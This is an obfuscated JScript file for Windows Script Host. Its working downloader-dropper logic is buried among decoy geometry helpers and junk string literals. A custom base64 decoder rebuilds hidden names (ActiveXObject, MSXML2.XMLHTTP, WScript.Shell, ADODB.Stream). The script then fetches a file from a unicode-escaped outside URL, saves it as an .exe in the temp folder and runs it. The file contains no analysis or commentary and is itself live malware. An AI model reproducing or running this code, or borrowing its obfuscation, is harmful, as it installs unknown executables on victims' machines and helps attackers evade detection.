
var patricia = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  written = [];
	
var swirling = { ':': '.','U': 'S','381': 'X'};
	var syndication = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function lines(killing) {
	located = killing;
	for (var i in swirling){located = located.replace(i, swirling[i]);}
    return located;
};

var statuary = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.lines4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.replace(/friendship/g, '')
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = patricia[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = patricia[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = patricia[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = patricia[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var tenable ="friendshipJVfriendshipRFTVfriendshipAl".lines4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var clear = "friendshipQWfriendshipN0aXZfriendshiplWE9iafriendshipmVjdA=friendship=".lines4();
String.prototype.lines2 = function () {
    var diver = {
        spectacular: this
    };
    diver.baseball = diver.spectacular["c3Vic3RyaW5n".lines4()](syndication, statuary);
    return diver.baseball;
};

var indite ="friendshipRXhwYW5friendshipkRW52aXfriendshipJvbm1lbnRTdHJfriendshippbmdz".lines4();
var Native = function(options){
	
};
var pupils = [clear, indite,tenable,  ""+"."+("cache","semicircle","cases","breathing","gourd","mysimon","landward","stripling","exe"), "UnVu".lines4(), lines("M"+"SX"+"ML"+("astern","preventing","barrack","velvet","macedonia","depreciation","outhouse","2.")+"381M"+"LH"+"TT"+("inferiority","stamps","coordinates","urban","eulogium","watershed","epilepsy","shortage","P>")+"WU"+("undertakings","cycle","unrest","influx","infections","woodpecker","considered","cr")+("unfathomable","apartments","adhere","insert","expence","enquiring","villas","swift","ip")+"t:"+("climb","wrestling","underworld","ablution","observatory","sylvan","argue","quicksilver","Sh")+"ell")];
disappoint = "_F2_";
var cholesterol = this[pupils.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
pqPCqPoppX = "PpeOcpPHd";
easter = (("banging", "distinct", "mundane", "cologne", "bangkok", "sacerdotal", "instance", "pSdOkMxDNML") + "BtmcTsaRsV").lines2();
utilize = (("hybrid", "guiana", "aggregation", "saints", "welfare", "bright", "molecules", "swede", "supplies", "sVdmxeKE") + "wKrUwnbrC").lines2();
  
    String.prototype.segment = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var celia = pupils.pop().split(">");

grande = "b3Blbg==".lines4();
var choral = new cholesterol(celia[1]);
var freshman = new cholesterol(celia[0]);
var michael = choral[pupils.shift()](pupils.shift());
weasel = "E";

var variant = pupils.shift();
var floating = pupils.shift();
function drums(pleased, rivet) {

    try {
        var luscious = michael + "/" + rivet ;
		luscious = luscious+ variant;
            freshman[grande](("handhelds","cartilage","deadly","bloomberg","pizza","reactionary","polygamy","emotions","G" + weasel) + ("smithsonian","terrain","experiments","awestruck","crags","alton","describe","synthetic","constraint","rubble","T"), pleased, false);
       
    freshman[utilize + ("stadium","smack","end")]();
	var toolkit=("easter" + WScript=="easter" + "V2luZG93cyBTY3JpcHQgSG9zdA==".lines4())&&freshman["c3RhdHVz".lines4()] +""=="MjAw".lines4()&&typeof(KBClMnVR)==="undefined";

    if (toolkit) {
		
        var credible = new cholesterol((("wired","aiming","presenting","tampa","chiefest","preternatural","expectant","editorials","A")+("practitioners","dragoman","stupor","university","penitence","scurry","irreverent","tradition","SEOO")+"DB"+("propitiate","motherhood","strain","barrage","indictment","despicable","populations",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        credible[grande]();
        hWOPKSGgKX = "_F9_";
        credible.type = statuary;
        tRiloek = "_F10_";
        credible["d3JpdGU=".lines4()](freshman[("paunch","motherinlaw","smirk","handhelds","handicapped","lawsuit","maltese","")+"R"+"es"+"pon"+swirling['U'].toLowerCase()+"e"+"Qm9keQ==".lines4()]);
        OOSaxzHu = "_F11_";
        credible[(easter + "o"+("tambourine","consoles","generate","houses","punch","toolbox","squirting","otherwise","00")+("tulsa","couplet","thirtyeight","programming","bracelet","complacency","reverse","8i")+"tion").replace("0"+("unforgettable","catalogues","bragging","locally","advisor","rating","combated","08"), utilize)] = 0;
        JpXBlYwDHT = "_F12_";
        credible.saveToFile(luscious, 2);
        bOgptnXRs = "_F13_";
        credible.close();
        VIdxcVoW = "_F14_";
		choral[floating](luscious, statuary, true);
    }
} catch (qdyXwvYM) { };

    SLGGkD = "_F15_";
}
try{
drums("aHRfriendship0cDfriendshipovLw=friendship=".lines4()+"\u0077\u0077\u0077"+"\u002E\u0063\u0065\u006E\u0074\u0072\u006F\u0069\u006E\u0066\u0061\u006E\u0074\u0069\u006C\u0065\u006C\u006D\u006F\u006C\u0069\u006E\u006F\u002E\u0063\u006F\u006D\u002F\u0037\u0038\u0074\u0067\u0037\u0036\u0038\u0062" + "?YIDFjAOb=MFUeidiF","DCCQISu");}catch(QYGJpyybd){}

   KrhOnwG = "_F16_";
   